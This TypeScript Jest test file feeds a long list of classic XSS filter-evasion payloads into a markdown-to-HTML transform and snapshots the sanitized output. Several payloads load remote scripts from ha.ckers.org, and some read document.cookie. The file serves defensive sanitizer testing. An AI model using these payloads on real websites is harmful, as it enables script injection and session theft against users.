/* eslint no-useless-escape: 0 */

import transform from '../src/transform';

const html = (text: string, options?: Parameters<typeof transform>[1]) => {
    const {
        result: {html},
    } = transform(text, {
        allowHTML: true,
        ...options,
    });
    return html;
};

// https://sking7.github.io/articles/218647712.html

const ckecks = [
    [
        'XSS Locator 1',
        `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></script>">'><script>alert(String.fromCharCode(88,83,83))</script>`,
    ],
    ['XSS locator 2', `'';!--"<XSS>=&{()}`],
    ['No Filter Evasion', `<script src=http://ha.ckers.org/xss.js></script>`],
    ['Image XSS using the JavaScript directive', `<img src="javascript:alert('XSS');">`],
    ['No quotes and no semicolon', `<img src=javascript:alert('XSS')>`],
    ['Case insensitive XSS attack vector', `<img src=JaVaScRiPt:alert('XSS')>`],
    ['HTML entities', `<img src=javascript:alert("XSS")>`],
    ['Grave accent obfuscation', "<img src='javascript:alert(\"RSnake says, 'XSS'\")'>"],
    ['Malformed A tags', '<a onmouseover=alert(document.cookie)>xxs link</a>'],
    ['Malformed img tags', '<img """><script>alert("XSS")</script>">'],
    ['fromCharCode', '<img src=javascript:alert(String.fromCharCode(88,83,83))>'],
    [
        'Default src tag to get past filters that check src domain',
        `<img src=# onmouseover="alert('xxs')">`,
    ],
    ['Default src tag by leaving it empty', `<img src= onmouseover="alert('xxs')">`],
    ['Default src tag by leaving it out entirely', `<img onmouseover="alert('xxs')">`],
    [
        'Decimal HTML character references',
        `<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
    ],
    [
        'Decimal HTML character references without trailing semicolons',
        `<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
    ],
    [
        'Hexadecimal HTML character references without trailing semicolons',
        `<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
    ],
    ['Embedded tab', `<img src="jav	ascript:alert('XSS');">`],
    ['Embedded Encoded tab', `<img src="jav&#x09;ascript:alert('XSS');">`],
    ['Embedded newline to break up XSS', `<img src="jav&#x0A;ascript:alert('XSS');">`],
    ['Embedded carriage return to break up XSS', `<img src="jav&#x0D;ascript:alert('XSS');">`],
    [
        'Null breaks up JavaScript directive',
        `perl -e 'print "<img src=java\0script:alert(\"XSS\")>";' > out`,
    ],
    [
        'Spaces and meta chars before the JavaScript in images for XSS',
        `<img src=" &#14;  javascript:alert('XSS');">`,
    ],
    ['Non-alpha-non-digit XSS 1', `<script/xss src="http://ha.ckers.org/xss.js"></script>`],
    ['Non-alpha-non-digit XSS 2', '<body onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")>'],
    ['Non-alpha-non-digit XSS 3', '<script/src="http://ha.ckers.org/xss.js"></script>'],
    ['Non-alpha-non-digit XSS 4', '<<script>alert("XSS");//<</script>'],
    ['No closing script tags', '<script src=http://ha.ckers.org/xss.js?< b >'],
    ['Protocol resolution in script tags', '<script src=//ha.ckers.org/.j>'],
    ['Half open HTML/JavaScript XSS vector', `<img src="javascript:alert('XSS')"`],
    ['Double open angle brackets', `<iframe src=http://ha.ckers.org/scriptlet.html <`],
    ['Escaping JavaScript escapes', `\";alert('XSS');//`],
    ['End title tag', `</title><script>alert("XSS");</script>`],
    ['input image', `<input type="image" src="javascript:alert('XSS');">`],
    ['body image', `<body background="javascript:alert('XSS')">`],
    ['img Dynsrc', `<img dynsrc="javascript:alert('XSS')">`],
    ['img lowsrc', `<img lowsrc="javascript:alert('XSS')">`],
    [
        'List-style-image',
        `<style>li {list-style-image: url("javascript:alert('XSS')");}</style><UL><LI>XSS</br>`,
    ],
    ['VBscript in an image', `<img src='vbscript:msgbox("XSS")'>`],
    ['Livescript', `<img src="livescript:[code]">`],
    ['body tag', `<body onload=alert('XSS')>`],
    ['BGSOUND', `<bgsound src="javascript:alert('XSS');">`],
    ['& JavaScript includes', `<br SIZE="&{alert('XSS')}">`],
    ['style sheet', `<link rel="stylesheet" href="javascript:alert('XSS');">`],
    ['Remote style sheet', `<link rel="stylesheet" href="http://ha.ckers.org/xss.css">`],
    ['Remote style sheet part 2', `<style>@import'http://ha.ckers.org/xss.css';</style>`],
    [
        'Remote style sheet part 3',
        `<meta http-equiv="Link" Content="<http://ha.ckers.org/xss.css>; rel=stylesheet">`,
    ],
    [
        'Remote style sheet part 4',
        `<style>body{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</style>`,
    ],
    [
        'style tags with broken up JavaScript for XSS',
        `<style>@im\port'\ja\vasc\ript:alert("XSS")';</style>`,
    ],
    [
        'style tags with broken up JavaScript for XSS part 2',
        `<img style="xss:expr/*XSS*/ession(alert('XSS'))">`,
    ],
    ['img style with expression', `exp/*<a style='no\\xss:noxss("*//*");`],
    ['img style with expression', `exp/*<a style='no\\xss:noxss("*//*");`],
    ['style tag', `<style type="text/javascript">alert('XSS');</style>`],
    [
        'style tag using background-image',
        `<style>.xss{background-image:url("javascript:alert('XSS')");}</style><a class=XSS></a>`,
    ],
    [
        'style tag using background',
        `<style type="text/css">body{background:url("javascript:alert('XSS')")}</style>`,
    ],
    [
        'svg with style tag and foreignObject inside',
        '<svg><style><foreignObject><img src="a" onerror=alert(1)/></foreignObject></style></svg>',
    ],
    ['Anonymous HTML with style attribute', `<xss style="xss:expression(alert('XSS'))">`],
    ['Local htc file', `<xss style="behavior: url(xss.htc);">`],
    ['US-ASCII encoding', `¼script¾alert(¢XSS¢)¼/script¾`],
    ['meta', `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">`],
    ['iframe', `<iframe src="javascript:alert('XSS');"></iframe>`],
    ['iframe Event based', `<iframe src=# onmouseover="alert(document.cookie)"></iframe>`],
    ['frame', `<frameset><frame src="javascript:alert('XSS');"></frameset>`],
    ['TABLE', `<table background="javascript:alert('XSS')">`],
    ['TD', `<table><td background="javascript:alert('XSS')">`],
    ['DIV background-image', `<div style="background-image: url(javascript:alert('XSS'))">`],
    [
        'DIV background-image with unicoded XSS exploit',
        `<div style="background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">`,
    ],
    [
        'DIV background-image with unicoded XSS exploit 2',
        `<div style="background-image: url(&#1;javascript:alert('XSS'))">`,
    ],
    ['DIV expression', `<div style="width: expression(alert('XSS'));">`],
    ['Downlevel-Hidden block', `<!--[if gte IE 4]>\n<script>alert('XSS');</script>\n<![endif]-->`],
    ['BASE tag', `<base href="javascript:alert('XSS');//">`],
    [
        'OBJECT tag',
        `<object type="text/x-scriptlet" data="http://ha.ckers.org/scriptlet.html"></object>`,
    ],
    [
        'Using an EMBED tag you can embed a Flash movie that contains XSS',
        `<embed src="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></embed>`,
    ],
    [
        'You can EMBED SVG which can contain your XSS vector',
        `<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></embed>`,
    ],
    ['XML tag', `<xml></xml>`],
    [
        'Assuming you can only fit in a few characters and it filters against ".js"',
        `<script src="http://ha.ckers.org/xss.jpg"></script>`,
    ],
    [
        'SSI (Server Side Includes)',
        `<!--#exec cmd="/bin/echo '<scr'"--><!--#exec cmd="/bin/echo 'IPT src=http://ha.ckers.org/xss.js></script>'"-->`,
    ],
    ['PHP', `<? echo('<SCR)';\necho('IPT>alert("XSS")</SCRIPT>'); ?>`],
    [
        'xlink:href',
        `<div id="test"><svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(document.domain)"><circle r="400"></circle><animate attributeName="xlink:href" begin="0" from="javascript:alert(document.domain)" to="&" /></a></div>`,
    ],
    [
        'href animate from',
        `<div id="test"><svg><a xmlns:xlink="http://www.w3.org/1999/xlink" href="javascript:alert(document.domain)"><circle r="400"></circle><animate attributeName="href" begin="0" from="javascript:alert(document.domain)" to="&" /></a></div>`,
    ],
    [
        'animate with values attribute',
        `<svg><animate xlink:href="#xss" attributeName="href" values="javascript:alert(1)"></animate><a id="xss"><text x="20" y="20">XSS</text></a></svg>`,
    ],
    [
        'animate with values attribute and data: scheme',
        `<svg><animate xlink:href="#x" attributeName="href" values="data:text/html,<script>alert(1)</script>"></animate><a id="x"><text>Click</text></a></svg>`,
    ],
];

describe.each([
    ['enabled', true],
    ['disabled', false],
])('XSS checks with %s markdown-it-attrs', (_0, enableMarkdownAttrs) => {
    ckecks.forEach(([name, input]) => {
        it(name, () => {
            expect(html(input, {enableMarkdownAttrs})).toMatchSnapshot();
        });
    });
});
